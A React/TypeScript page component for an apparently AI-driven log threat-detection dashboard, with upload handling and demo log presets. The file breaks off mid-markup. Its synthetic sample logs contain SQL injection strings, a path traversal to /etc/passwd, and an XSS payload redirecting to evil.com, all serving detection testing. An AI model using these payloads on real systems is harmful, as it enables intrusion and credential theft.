import React, { useState, useId } from 'react';
import {
  ShieldAlert,
  ShieldCheck,
  Play,
  Upload,
  FileText,
  AlertTriangle,
  Activity,
  ArrowRight,
  Terminal,
  CheckCircle2,
  Copy,
  Check,
  Network,
  Cpu,
  Globe,
  Sparkles,
  Layers,
  FileCode,
  RotateCcw,
  X,
  Search,
  Filter,
  Eye,
  Clock,
  HardDrive,
  BarChart3,
  ListFilter,
  HelpCircle,
  ExternalLink,
  ChevronRight,
  Shield,
  FileSpreadsheet,
  Braces
} from 'lucide-react';
import { NavPageId } from '../types';
import { logRepository } from '../services/logRepository';

export interface Finding {
  id?: string;
  agent: string;
  threat_type: string;
  severity: 'LOW' | 'MEDIUM' | 'HIGH' | 'CRITICAL';
  confidence: number;
  description: string;
  evidence?: string[];
  indicators?: string[];
  mitre_technique?: string;
  mitre_tactic?: string;
  source_ip?: string;
  destination_ip?: string;
  timestamp?: string;
}

export interface RiskAssessment {
  risk_score: number;
  risk_band: 'Critical' | 'High' | 'Medium' | 'Low' | string;
  priority: 'P1' | 'P2' | 'P3' | 'P4' | string;
  factors?: Record<string, any>;
  explanation?: string;
}

export interface Correlation {
  id?: string;
  type?: string;
  rule?: string;
  strength?: string;
  score?: number;
  correlation_score?: number;
  description?: string;
  threat_types?: string[];
  agents_involved?: string[];
  source_ip?: string;
  event_count?: number;
}

export interface FileReport {
  filename: string;
  detected_format: string;
  detected_source_type: string;
  records_count: number;
  valid_records_count: number;
  duplicate_count: number;
  error_count: number;
  processing_status: string;
  analysis_status: string;
}

export interface StandardEvent {
  event_id: string;
  timestamp: string;
  source_type: string;
  source_file: string;
  src_ip?: string;
  dst_ip?: string;
  src_port?: number;
  dst_port?: number;
  protocol?: string;
  username?: string;
  host?: string;
  event_type: string;
  action?: string;
  status?: string;
  message: string;
  raw_event: string;
  is_duplicate?: boolean;
}

export interface CorrelatedIncidentItem {
  incident_id: string;
  title: string;
  threat_type: string;
  source_type: string;
  severity: 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW';
  priority: 'P1' | 'P2' | 'P3' | 'P4';
  risk_score: number;
  confidence: number;
  anomaly_score: number;
  mitre_mapping?: {
    technique_id: string;
    technique_name: string;
    tactic: string;
  };
  affected_entities?: {
    ips: string[];
    users: string[];
    hosts: string[];
    ports: number[];
  };
  evidence?: string[];
  agent_findings?: Finding[];
  timeline?: Array<{
    step: number;
    timestamp: string;
    phase: string;
    description: string;
    entity: string;
  }>;
  risk_factors?: {
    threat_severity_score: number;
    ml_confidence_score: number;
    anomaly_frequency_score: number;
    correlation_score: number;
    entities_score: number;
    calculated_total: number;
    formula_explanation: string;
  };
}

export interface AnalysisResult {
  status: string;
  events_parsed: number;
  events_by_source?: { network: number; system: number; application: number; unknown?: number };
  threat_detected: boolean;
  findings: Finding[];
  findings_count: number;
  agents_used: string[];
  correlations?: Correlation[];
  risk_assessment?: RiskAssessment;
  incident?: {
    id: string;
    incident_id?: string;
    title: string;
    severity: string;
    priority: string;
    primary_ip?: string;
    affected_host?: string;
    mitre_techniques?: string[];
    evidence?: string[];
  };
  processing_time_ms: number;
  analyzed_at: string;
  filename?: string;

  // Enhanced Pipeline Fields
  files_analyzed?: number;
  files?: FileReport[];
  pipeline_stages?: Array<{
    stage: string;
    name: string;
    status: string;
    details: string;
    duration_ms: number;
  }>;
  incidents?: CorrelatedIncidentItem[];
  standard_events?: StandardEvent[];
  ml_evaluation?: {
    random_forest: {
      predicted_class: string;
      confidence: number;
      model_id: string;
    };
    isolation_forest: {
      is_anomaly: boolean;
      anomaly_score: number;
    };
  };
  valid_events?: number;
  duplicate_events?: number;
  suspicious_events?: number;
}

export interface UploadedFileItem {
  id: string;
  name: string;
  size: number;
  content: string;
  detectedFormat: string;
  lineCount: number;
}

interface AnalyzeLogsPageProps {
  onNavigate?: (page: NavPageId) => void;
  onNavigateToIncident?: (incidentId: string) => void;
  onAnalysisComplete?: () => void;
}

// Preset Attack Scenarios with Multi-Format Support
const DEMO_PRESETS = [
  {
    id: 'mixed_attack',
    name: 'Multi-Stage Attack Chain',
    badge: 'Multi-Agent Chain',
    badgeColor: 'bg-red-500/20 text-red-400 border-red-500/30',
    format: 'JSON / Syslog',
    description: 'Port scan + SSH brute force root escalation + SQL injection web exploit',
    source: 'auto',
    sample: `{"timestamp":"2026-09-17T11:00:01Z","src_ip":"203.0.113.50","dst_ip":"10.0.0.5","port":22,"proto":"TCP","action":"connect","event_type":"PORT_SCAN"}
{"timestamp":"2026-09-17T11:00:02Z","src_ip":"203.0.113.50","dst_ip":"10.0.0.5","port":80,"proto":"TCP","action":"connect","event_type":"PORT_SCAN"}
{"timestamp":"2026-09-17T11:00:03Z","src_ip":"203.0.113.50","dst_ip":"10.0.0.5","port":443,"proto":"TCP","action":"connect","event_type":"PORT_SCAN"}
{"timestamp":"2026-09-17T11:00:04Z","src_ip":"203.0.113.50","dst_ip":"10.0.0.5","port":3306,"proto":"TCP","action":"connect","event_type":"PORT_SCAN"}
Sep 17 11:01:01 server01 sshd[12345]: Failed password for admin from 203.0.113.50 port 54321 ssh2
Sep 17 11:01:03 server01 sshd[12345]: Failed password for admin from 203.0.113.50 port 54322 ssh2
Sep 17 11:01:05 server01 sshd[12345]: Failed password for root from 203.0.113.50 port 54323 ssh2
Sep 17 11:01:07 server01 sshd[12345]: Failed password for admin from 203.0.113.50 port 54324 ssh2
Sep 17 11:01:09 server01 sshd[12345]: Accepted password for admin from 203.0.113.50 port 54325 ssh2
Sep 17 11:01:11 server01 sudo: admin : TTY=pts/0 ; PWD=/home ; USER=root ; COMMAND=/bin/bash
2026-09-17T11:02:01Z 203.0.113.50 POST /api/data HTTP/1.1 200 application/json body=1' UNION SELECT * FROM users--
2026-09-17T11:02:05Z 203.0.113.50 GET /admin/console HTTP/1.1 403 text/html`
  },
  {
    id: 'network_port_scan_csv',
    name: 'Network Port Scan (CSV)',
    badge: 'Network Agent',
    badgeColor: 'bg-blue-500/20 text-blue-400 border-blue-500/30',
    format: 'CSV Telemetry',
    description: 'Rapid port sweep targeting standard infrastructure services',
    source: 'network',
    sample: `timestamp,src_ip,dst_ip,src_port,dst_port,protocol,flags,action,status
2026-09-17T10:15:01Z,192.168.1.105,10.0.0.5,49152,21,TCP,SYN,connect,closed
2026-09-17T10:15:02Z,192.168.1.105,10.0.0.5,49153,22,TCP,SYN,connect,open
2026-09-17T10:15:03Z,192.168.1.105,10.0.0.5,49154,23,TCP,SYN,connect,closed
2026-09-17T10:15:04Z,192.168.1.105,10.0.0.5,49155,80,TCP,SYN,connect,open
2026-09-17T10:15:05Z,192.168.1.105,10.0.0.5,49156,443,TCP,SYN,connect,open
2026-09-17T10:15:06Z,192.168.1.105,10.0.0.5,49157,3306,TCP,SYN,connect,filtered
2026-09-17T10:15:07Z,192.168.1.105,10.0.0.5,49158,5432,TCP,SYN,connect,closed
2026-09-17T10:15:08Z,192.168.1.105,10.0.0.5,49159,8080,TCP,SYN,connect,open
2026-09-17T10:15:09Z,192.168.1.105,10.0.0.5,49160,3389,TCP,SYN,connect,filtered`
  },
  {
    id: 'system_brute_force_log',
    name: 'SSH Brute Force (auth.log)',
    badge: 'System Agent',
    badgeColor: 'bg-amber-500/20 text-amber-400 border-amber-500/30',
    format: 'Linux auth.log',
    description: 'High-frequency credential stuffing followed by privilege escalation',
    source: 'system',
    sample: `Sep 17 10:20:01 server01 sshd[12345]: Failed password for root from 10.0.1.50 port 54321 ssh2
Sep 17 10:20:03 server01 sshd[12345]: Failed password for admin from 10.0.1.50 port 54322 ssh2
Sep 17 10:20:05 server01 sshd[12345]: Failed password for root from 10.0.1.50 port 54323 ssh2
Sep 17 10:20:07 server01 sshd[12345]: Failed password for admin from 10.0.1.50 port 54324 ssh2
Sep 17 10:20:09 server01 sshd[12345]: Failed password for root from 10.0.1.50 port 54325 ssh2
Sep 17 10:20:11 server01 sshd[12345]: Failed password for user from 10.0.1.50 port 54326 ssh2
Sep 17 10:20:13 server01 sshd[12345]: Accepted password for admin from 10.0.1.50 port 54327 ssh2
Sep 17 10:20:15 server01 sudo: admin : TTY=pts/0 ; PWD=/home/admin ; USER=root ; COMMAND=/bin/bash`
  },
  {
    id: 'application_sqli_jsonl',
    name: 'Web SQLi & Traversal (JSONL)',
    badge: 'Application Agent',
    badgeColor: 'bg-purple-500/20 text-purple-400 border-purple-500/30',
    format: 'JSONL Web Stream',
    description: 'SQL union injection, directory traversal, and reflected XSS',
    source: 'application',
    sample: `{"timestamp":"2026-09-17T10:25:01Z","src_ip":"192.168.1.200","method":"GET","path":"/api/users?id=1' OR '1'='1","status":200,"user_agent":"sqlmap/1.5"}
{"timestamp":"2026-09-17T10:25:02Z","src_ip":"192.168.1.200","method":"POST","path":"/api/login","status":401,"user_agent":"Mozilla/5.0"}
{"timestamp":"2026-09-17T10:25:04Z","src_ip":"192.168.1.200","method":"GET","path":"/api/users?id=1 UNION SELECT username,password FROM users--","status":500,"user_agent":"sqlmap/1.5"}
{"timestamp":"2026-09-17T10:25:05Z","src_ip":"192.168.1.200","method":"GET","path":"/api/data?file=../../../../etc/passwd","status":400,"user_agent":"curl/7.68.0"}
{"timestamp":"2026-09-17T10:25:07Z","src_ip":"192.168.1.200","method":"POST","path":"/api/search?q=<script>document.location='http://evil.com/c='</script>","status":200,"user_agent":"Mozilla/5.0"}`
  },
  {
    id: 'normal_traffic_baseline',
    name: 'Normal Operations (Baseline)',
    badge: 'Benign Baseline',
    badgeColor: 'bg-emerald-500/20 text-emerald-400 border-emerald-500/30',
    format: 'Syslog / HTTP',
    description: 'Clean legitimate operational telemetry confirming zero false positives',
    source: 'auto',
    sample: `2026-09-17T10:30:01Z src_ip=192.168.1.10 dst_ip=10.0.0.1 port=443 proto=TCP action=connect status=established
2026-09-17T10:30:05Z src_ip=192.168.1.10 dst_ip=10.0.0.1 port=443 proto=TCP bytes_sent=1500 bytes_recv=3200
Sep 17 10:30:10 server01 sshd[99999]: Accepted password for developer from 192.168.1.10 port 55000 ssh2
Sep 17 10:30:15 server01 systemd[1]: Started Daily apt download activities.
2026-09-17T10:30:20Z 192.168.1.10 GET /api/dashboard HTTP/1.1 200 application/json
2026-09-17T10:30:25Z 192.168.1.10 GET /api/profile HTTP/1.1 200 application/json`
  }
];

export const AnalyzeLogsPage: React.FC<AnalyzeLogsPageProps> = ({
  onNavigate,
  onNavigateToIncident,
  onAnalysisComplete
}) => {
  const [inputMode, setInputMode] = useState<'files' | 'text'>('files');
  const [uploadedFiles, setUploadedFiles] = useState<UploadedFileItem[]>([]);
  const [logText, setLogText] = useState<string>(DEMO_PRESETS[0].sample);
  const [sourceType, setSourceType] = useState<string>('auto');
  const [isAnalyzing, setIsAnalyzing] = useState<boolean>(false);
  const [currentStepIndex, setCurrentStepIndex] = useState<number>(0);
  const [analysisStep, setAnalysisStep] = useState<string>('');
  const [result, setResult] = useState<AnalysisResult | null>(null);
  const [error, setError] = useState<string | null>(null);
  const [copied, setCopied] = useState<boolean>(false);
  const [activeTab, setActiveTab] = useState<'overview' | 'preprocessing' | 'agents' | 'correlation' | 'threats' | 'risk'>('overview');

  // Interactive Drill-Down Modal State
  const [selectedEvent, setSelectedEvent] = useState<StandardEvent | null>(null);
  const [selectedFinding, setSelectedFinding] = useState<Finding | null>(null);
  const [selectedIncident, setSelectedIncident] = useState<CorrelatedIncidentItem | null>(null);

  // Preprocessing Table Filter State
  const [eventSearch, setEventSearch] = useState<string>('');
  const [sourceFilter, setSourceFilter] = useState<string>('ALL');

  const fileInputId = useId();

  // Helper to detect log file format
  const detectFormat = (filename: string, content: string): string => {
    const ext = filename.split('.').pop()?.toLowerCase();
    if (ext === 'csv') return 'CSV';
    if (ext === 'json') return 'JSON';
    if (ext === 'jsonl') return 'JSONL';
    const trimmed = content.trim();
    if (trimmed.startsWith('{') && trimmed.endsWith('}')) return 'JSON';
    if (trimmed.split('\n').every(l => l.trim().startsWith('{') && l.trim().endsWith('}'))) return 'JSONL';
    if (trimmed.includes(',') && trimmed.split('\n')[0].includes(',')) return 'CSV';
    if (trimmed.includes('sshd') || trimmed.includes('kernel') || trimmed.includes('sudo')) return 'SYSLOG';
    return 'LOG / TXT';
  };

  // Multiple File Upload Handler
  const handleMultipleFiles = (files: FileList | null) => {
    if (!files || files.length === 0) return;
    setError(null);

    Array.from(files).forEach((file) => {
      const reader = new FileReader();
      reader.onload = (e) => {
        const text = (e.target?.result as string) || '';
        const lines = text.trim() ? text.trim().split('\n').length : 0;
        const format = detectFormat(file.name, text);

        setUploadedFiles((prev) => {
          // Avoid exact duplicates by filename
          const filtered = prev.filter((item) => item.name !== file.name);
          return [
            ...filtered,
            {
              id: `${file.name}-${Date.now()}`,
              name: file.name,
              size: file.size,
              content: text,
              detectedFormat: format,
              lineCount: lines
            }
          ];
        });
        setInputMode('files');
      };
      reader.onerror = () => {
        setError(`Failed reading ${file.name}`);
      };
      reader.readAsText(file);
    });
  };

  const handleRemoveFile = (id: string) => {
    setUploadedFiles((prev) => prev.filter((f) => f.id !== id));
  };

  const handleClearAllFiles = () => {
    setUploadedFiles([]);
    setResult(null);
    setError(null);
  };

  // Load a quick demo scenario into uploaded files or text
  const handleSelectPreset = (preset: typeof DEMO_PRESETS[0]) => {
    setError(null);
    setResult(null);
    setLogText(preset.sample);
    setSourceType(preset.source);

    const ext = preset.format.includes('CSV') ? 'csv' : preset.format.includes('JSONL') ? 'jsonl' : preset.format.includes('JSON') ? 'json' : 'log';
    const filename = `${preset.id}.${ext}`;
    const lines = preset.sample.trim().split('\n').length;
    const format = detectFormat(filename, preset.sample);

    setUploadedFiles([
      {
        id: preset.id,
        name: filename,
        size: new Blob([preset.sample]).size,
        content: preset.sample,
        detectedFormat: format,
        lineCount: lines
      }
    ]);
  };

  // Run the full 6-stage pipeline
  const handleRunAnalysis = async () => {
    const hasFiles = uploadedFiles.length > 0;
    const hasText = logText.trim().length > 0;

    if (!hasFiles && !hasText) {
      setError('Please upload log files (CSV, JSON, JSONL, TXT, LOG) or paste log text to analyze.');
      return;
    }

    setIsAnalyzing(true);
    setError(null);
    setCurrentStepIndex(0);

    const steps = [
      'Stage 1: Ingesting uploaded file streams & validating schema...',
      'Stage 2: Cleaning, normalizing timestamps, IPs, ports & extracting fields...',
      'Stage 3: Dispatching to NetworkAgent, SystemAgent, ApplicationAgent...',
      'Stage 4: Executing Cross-Surface Event Correlation & Kill-Chain synthesis...',
      'Stage 5: Evaluating threats via Rule Engine + ML Random & Isolation Forests...',
      'Stage 6: Computing evidence-based risk score & compiling dashboard results...'
    ];

    setAnalysisStep(steps[0]);

    let stepCounter = 0;
    const interval = setInterval(() => {
      stepCounter++;
      if (stepCounter < steps.length) {
        setCurrentStepIndex(stepCounter);
        setAnalysisStep(steps[stepCounter]);
      }
    }, 280);

    try {
      let payload: any;
      if (inputMode === 'files' && uploadedFiles.length > 0) {
        payload = {
          files: uploadedFiles.map((f) => ({
            filename: f.name,
            content: f.content,
            sourceType
          }))
        };
      } else {
        payload = {
          log_text: logText,
          source_type: sourceType,
          filename: uploadedFiles[0]?.name || 'direct_stream.log'
        };
      }

      const response = await fetch('/api/analyze', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload)
      });

      clearInterval(interval);

      if (!response.ok) {
        const errData = await response.json().catch(() => ({ error: `HTTP ${response.status}` }));
        throw new Error(errData.error || errData.message || 'Log analysis failed on server');
      }

      const data: AnalysisResult = await response.json();
      setResult(data);

      // Ingest the analyzed logs into local log repository for seamless real-time dashboard sync
      try {
        const textToIngest = inputMode === 'files' && uploadedFiles.length > 0
          ? uploadedFiles.map(f => f.content).join('\n')
          : logText;
        await logRepository.ingestRawContent(textToIngest, uploadedFiles[0]?.name || 'analyzed_batch.log');
        if (onAnalysisComplete) {
          onAnalysisComplete();
        }
      } catch (ingestErr) {
        console.warn('Non-fatal local repository sync warning:', ingestErr);
      }
    } catch (err: any) {
      clearInterval(interval);
      console.error('Analysis error:', err);
      setError(`Analysis Failed: ${err.message || 'Error executing multi-agent pipeline'}`);
    } finally {
      setIsAnalyzing(false);
      setAnalysisStep('');
    }
  };

  const handleCopyLogText = () => {
    navigator.clipboard.writeText(logText);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  // Filtered preprocessed events
  const filteredEvents = (result?.standard_events || []).filter((evt) => {
    const matchesSource =
      sourceFilter === 'ALL' || evt.source_type.toUpperCase() === sourceFilter.toUpperCase();
    const query = eventSearch.toLowerCase();
    const matchesQuery =
      !query ||
      evt.raw_event?.toLowerCase().includes(query) ||
      evt.src_ip?.toLowerCase().includes(query) ||
      evt.dst_ip?.toLowerCase().includes(query) ||
      evt.event_type?.toLowerCase().includes(query) ||
      evt.username?.toLowerCase().includes(query) ||
      evt.message?.toLowerCase().includes(query);
    return matchesSource && matchesQuery;
  });

  return (
    <div className="space-y-8 max-w-7xl mx-auto pb-16">
      {/* Top Header Banner */}
      <div className="relative overflow-hidden rounded-2xl bg-gradient-to-r from-slate-900 via-slate-850 to-indigo-950 p-6 md:p-8 border border-slate-800 shadow-xl">
        <div className="absolute right-0 top-0 w-96 h-96 bg-indigo-500/10 rounded-full blur-3xl pointer-events-none" />
        <div className="flex flex-col md:flex-row md:items-center justify-between gap-6 relative z-10">
          <div>
            <div className="flex items-center gap-3 mb-2">
              <span className="p-2 rounded-lg bg-indigo-500/20 text-indigo-400 border border-indigo-500/30">
                <Layers className="w-6 h-6" />
              </span>
              <span className="text-xs font-semibold uppercase tracking-wider text-indigo-400 bg-indigo-950/60 px-2.5 py-1 rounded-full border border-indigo-800/50">
                Pipeline Stages 1 → 6 Real Log Analysis
              </span>
            </div>
            <h1 className="text-2xl md:text-3xl font-bold text-white tracking-tight">
              AI-Driven Multi-Agent Cyber Threat Detection
            </h1>
            <p className="text-slate-400 text-sm md:text-base mt-2 max-w-2xl leading-relaxed">
              Upload log files (CSV, JSON, JSONL, TXT, LOG) or paste raw streams. The system executes real preprocessing, specialized agent analysis (Network, System, Application), cross-agent correlation, ML threat detection, and deterministic risk scoring.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2">
            <button
              onClick={() => {
                handleClearAllFiles();
                setLogText('');
              }}
              className="px-3.5 py-2 rounded-xl bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-medium border border-slate-700 flex items-center gap-2 transition"
            >
              <RotateCcw className="w-3.5 h-3.5" /> Clear All
            </button>
          </div>
        </div>
      </div>

      {/* Quick Demonstration Scenarios Bar */}
      <div>
        <div className="flex items-center justify-between mb-3">
          <span className="text-xs font-semibold uppercase tracking-wider text-slate-400 flex items-center gap-2">
            <Sparkles className="w-4 h-4 text-cyan-400" /> One-Click Demonstration Log Datasets
          </span>
          <span className="text-xs text-slate-500">Select any scenario to pre-load realistic synthetic logs</span>
        </div>
        <div className="grid grid-cols-1 sm:grid-cols-2 lg:grid-cols-5 gap-3">
          {DEMO_PRESETS.map((p) => (
            <button
              key={p.id}
              onClick={() => handleSelectPreset(p)}
              className="p-3.5 rounded-xl bg-slate-900/90 hover:bg-slate-800/90 border border-slate-800 hover:border-slate-700 text-left transition group relative overflow-hidden flex flex-col justify-between"
            >
              <div>
                <div className="flex items-center justify-between gap-2 mb-2">
                  <span className="text-[10px] font-mono text-slate-400 bg-slate-800 px-2 py-0.5 rounded">
                    {p.format}
                  </span>
                  <span className={`text-[10px] px-2 py-0.5 rounded-full font-medium border ${p.badgeColor}`}>
                    {p.badge}
                  </span>
                </div>
                <h4 className="text-sm font-semibold text-slate-200 group-hover:text-white line-clamp-1">
                  {p.name}
                </h4>
                <p className="text-[11px] text-slate-500 mt-1 line-clamp-2 leading-relaxed">
                  {p.description}
                </p>
              </div>
            </button>
          ))}
        </div>
      </div>

      {/* Stage 1: Upload & Ingestion Controls */}
      <div className="bg-slate-900/90 border border-slate-800 rounded-2xl p-6 shadow-xl space-y-5">
        <div className="flex flex-wrap items-center justify-between gap-4 pb-4 border-b border-slate-800">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-cyan-500/10 text-cyan-400 border border-cyan-500/20">
              <Upload className="w-5 h-5" />
            </div>
            <div>
              <h2 className="text-base font-bold text-white flex items-center gap-2">
                Stage 1: Log File Ingestion & Format Detection
              </h2>
              <p className="text-xs text-slate-400">
                Supports single or multiple files: <strong>.csv</strong>, <strong>.json</strong>, <strong>.jsonl</strong>, <strong>.txt</strong>, <strong>.log</strong>
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 bg-slate-950/70 p-1 rounded-xl border border-slate-800">
            <button
              onClick={() => setInputMode('files')}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-1.5 ${
                inputMode === 'files'
                  ? 'bg-cyan-600 text-white shadow'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              <FileSpreadsheet className="w-3.5 h-3.5" /> Upload Files ({uploadedFiles.length})
            </button>
            <button
              onClick={() => setInputMode('text')}
              className={`px-3 py-1.5 rounded-lg text-xs font-medium transition flex items-center gap-1.5 ${
                inputMode === 'text'
                  ? 'bg-cyan-600 text-white shadow'
                  : 'text-slate-400 hover:text-slate-200'
              }`}
            >
              <FileCode className="w-3.5 h-3.5" /> Direct Text Stream
            </button>
          </div>
        </div>

        {/* Multi-File Upload Drag & Drop Area */}
        {inputMode === 'files' ? (
          <div className="space-y-4">
            <label
              htmlFor={fileInputId}
              onDragOver={(e) => e.preventDefault()}
              onDrop={(e) => {
                e.preventDefault();
                handleMultipleFiles(e.dataTransfer.files);
              }}
              className="border-2 border-dashed border-slate-700/80 hover:border-cyan-500/60 rounded-xl p-8 flex flex-col items-center justify-center text-center cursor-pointer transition bg-slate-950/40 group hover:bg-slate-950/70"
            >
              <div className="p-3 rounded-full bg-slate-900 group-hover:bg-cyan-950/60 text-slate-400 group-hover:text-cyan-400 transition mb-3">
                <Upload className="w-8 h-8" />
              </div>
              <span className="text-sm font-semibold text-slate-200 group-hover:text-white">
                Click or drag & drop multiple log files here
              </span>
              <span className="text-xs text-slate-500 mt-1 max-w-md">
                Automatic format parser detects CSV columns, JSON schemas, JSONL events, Linux syslog, Apache access logs, or plain text.
              </span>
              <input
                id={fileInputId}
                type="file"
                multiple
                accept=".log,.txt,.csv,.json,.jsonl"
                onChange={(e) => handleMultipleFiles(e.target.files)}
                className="hidden"
              />
            </label>

            {/* List of Loaded Files */}
            {uploadedFiles.length > 0 && (
              <div className="space-y-2">
                <div className="flex items-center justify-between text-xs text-slate-400 px-1 font-medium">
                  <span>Uploaded Files Ready for Pipeline ({uploadedFiles.length}):</span>
                  <span>Total ~{uploadedFiles.reduce((acc, f) => acc + f.lineCount, 0)} log lines</span>
                </div>
                <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-2.5">
                  {uploadedFiles.map((file) => (
                    <div
                      key={file.id}
                      className="p-3 rounded-xl bg-slate-950/80 border border-slate-800 flex items-center justify-between gap-3 text-xs"
                    >
                      <div className="flex items-center gap-2.5 min-w-0">
                        <div className="p-2 rounded bg-slate-900 text-cyan-400 border border-slate-800 shrink-0">
                          {file.detectedFormat === 'CSV' ? (
                            <FileSpreadsheet className="w-4 h-4" />
                          ) : file.detectedFormat === 'JSON' || file.detectedFormat === 'JSONL' ? (
                            <Braces className="w-4 h-4" />
                          ) : (
                            <FileText className="w-4 h-4" />
                          )}
                        </div>
                        <div className="min-w-0">
                          <div className="font-semibold text-slate-200 truncate">{file.name}</div>
                          <div className="text-[10px] text-slate-500 flex items-center gap-2 mt-0.5">
                            <span className="text-cyan-400 font-mono">{file.detectedFormat}</span>
                            <span>•</span>
                            <span>{Math.round(file.size / 1024)} KB</span>
                            <span>•</span>
                            <span>{file.lineCount} lines</span>
                          </div>
                        </div>
                      </div>
                      <button
                        onClick={() => handleRemoveFile(file.id)}
                        className="p-1.5 rounded-lg text-slate-500 hover:text-red-400 hover:bg-slate-900 transition shrink-0"
                        title="Remove file"
                      >
                        <X className="w-4 h-4" />
                      </button>
                    </div>
                  ))}
                </div>
              </div>
            )}
          </div>
        ) : (
          /* Direct Text Stream Scratchpad */
          <div className="space-y-3">
            <div className="flex items-center justify-between">
              <span className="text-xs text-slate-400">
                Paste raw log lines, auth.log, syslog, access.log, or JSON lines:
              </span>
              <button
                onClick={handleCopyLogText}
                className="p-1.5 rounded-md hover:bg-slate-800 text-slate-400 hover:text-slate-200 transition text-xs flex items-center gap-1"
                title="Copy log text"
              >
                {copied ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                <span>{copied ? 'Copied' : 'Copy'}</span>
              </button>
            </div>
            <textarea
              value={logText}
              onChange={(e) => setLogText(e.target.value)}
              placeholder="Paste raw log lines here..."
              rows={8}
              className="w-full bg-slate-950/80 border border-slate-800 rounded-xl p-3.5 font-mono text-xs text-slate-300 placeholder-slate-600 focus:outline-none focus:border-cyan-500 resize-y leading-relaxed"
            />
          </div>
        )}

        {/* Source Type Override & Run Action */}
        <div className="flex flex-wrap items-center justify-between gap-4 pt-4 border-t border-slate-800">
          <div className="flex items-center gap-3">
            <label className="text-xs text-slate-400 font-medium">Source Type Detection:</label>
            <select
              value={sourceType}
              onChange={(e) => setSourceType(e.target.value)}
              className="bg-slate-800 border border-slate-700 rounded-lg px-3 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500"
            >
              <option value="auto">Auto-Detect (Network, System, App)</option>
              <option value="network">Network Logs Only</option>
              <option value="system">System / Auth Logs Only</option>
              <option value="application">Application / Web Logs Only</option>
            </select>
          </div>

          <button
            onClick={handleRunAnalysis}
            disabled={isAnalyzing || (uploadedFiles.length === 0 && !logText.trim())}
            className="px-6 py-2.5 rounded-xl bg-gradient-to-r from-cyan-600 via-blue-600 to-indigo-600 hover:from-cyan-500 hover:to-indigo-500 disabled:from-slate-800 disabled:to-slate-800 text-white font-semibold text-sm shadow-lg shadow-cyan-900/30 flex items-center gap-2.5 transition active:scale-[0.98] disabled:cursor-not-allowed"
          >
            {isAnalyzing ? (
              <>
                <Activity className="w-4 h-4 animate-spin text-cyan-200" />
                <span>Running Pipeline...</span>
              </>
            ) : (
              <>
                <Play className="w-4 h-4 fill-white text-white" />
                <span>Run Multi-Agent Security Analysis</span>
              </>
            )}
          </button>
        </div>
      </div>

      {/* Progress & Live Pipeline Stage Stepper */}
      {isAnalyzing && (
        <div className="p-5 rounded-2xl bg-cyan-950/40 border border-cyan-800/60 shadow-xl space-y-3 animate-pulse">
          <div className="flex items-center justify-between">
            <div className="flex items-center gap-3">
              <Activity className="w-5 h-5 text-cyan-400 animate-spin" />
              <div className="text-sm font-bold text-cyan-200">
                Pipeline Execution In Progress
              </div>
            </div>
            <span className="text-xs font-mono text-cyan-400">
              Stage {currentStepIndex + 1} of 6
            </span>
          </div>
          <div className="text-xs text-cyan-300 font-mono bg-cyan-950/80 p-2.5 rounded-lg border border-cyan-800/50">
            {analysisStep}
          </div>
        </div>
      )}

      {/* Error Banner */}
      {error && (
        <div className="p-4 rounded-xl bg-red-950/40 border border-red-800/60 flex items-center gap-3 text-red-200 text-sm">
          <AlertTriangle className="w-5 h-5 text-red-400 shrink-0" />
          <span>{error}</span>
        </div>
      )}

      {/* Results View */}
      {result && (
        <div className="space-y-6 pt-2">
          {/* Main Top Verdict Banner */}
          <div
            className={`p-6 rounded-2xl border shadow-2xl relative overflow-hidden ${
              result.threat_detected
                ? 'bg-gradient-to-r from-red-950/80 via-slate-900 to-slate-900 border-red-500/40'
                : 'bg-gradient-to-r from-emerald-950/60 via-slate-900 to-slate-900 border-emerald-500/40'
            }`}
          >
            <div className="flex flex-col md:flex-row md:items-center justify-between gap-6">
              <div className="flex items-start gap-4">
                <span
                  className={`p-3.5 rounded-2xl shrink-0 ${
                    result.threat_detected
                      ? 'bg-red-500/20 text-red-400 border border-red-500/30'
                      : 'bg-emerald-500/20 text-emerald-400 border border-emerald-500/30'
                  }`}
                >
                  {result.threat_detected ? (
                    <ShieldAlert className="w-9 h-9" />
                  ) : (
                    <ShieldCheck className="w-9 h-9" />
                  )}
                </span>
                <div>
                  <div className="flex items-center gap-2 mb-1.5">
                    <span
                      className={`text-xs font-bold uppercase tracking-widest px-2.5 py-0.5 rounded-full ${
                        result.threat_detected
                          ? 'bg-red-500/20 text-red-300 border border-red-500/30'
                          : 'bg-emerald-500/20 text-emerald-300 border border-emerald-500/30'
                      }`}
                    >
                      {result.threat_detected ? 'Threats Detected' : 'Clean / Benign Baseline'}
                    </span>
                    <span className="text-xs text-slate-400">
                      Processed {result.events_parsed} events in {result.processing_time_ms}ms
                    </span>
                  </div>
                  <h2 className="text-xl md:text-2xl font-bold text-white">
                    {result.threat_detected
                      ? result.incident?.title || `${result.findings_count} Correlated Cyber Threat Indicators Detected`
                      : 'Zero Threats Identified — Normal Operational Activity'}
                  </h2>
                  <p className="text-xs md:text-sm text-slate-400 mt-1 max-w-3xl leading-relaxed">
                    {result.threat_detected
                      ? `Real analysis executed across NetworkAgent, SystemAgent, and ApplicationAgent. Identified ${result.findings_count} specific indicators with ${result.correlations?.length || 0} correlated cross-surface chains.`
                      : 'Normalized logs parsed cleanly. All evaluated traffic conforms to benign behavioral baselines with zero false positive signatures.'}
                  </p>
                </div>
              </div>

              {/* Deterministic Risk Meter */}
              {result.risk_assessment && (
                <div className="flex items-center gap-4 bg-slate-950/80 p-5 rounded-2xl border border-slate-800 shrink-0">
                  <div className="text-right">
                    <div className="text-xs text-slate-400 font-medium">Deterministic Risk Score</div>
                    <div
                      className={`text-3xl font-extrabold ${
                        result.risk_assessment.risk_score >= 70
                          ? 'text-red-400'
                          : result.risk_assessment.risk_score >= 40
                          ? 'text-amber-400'
                          : 'text-emerald-400'
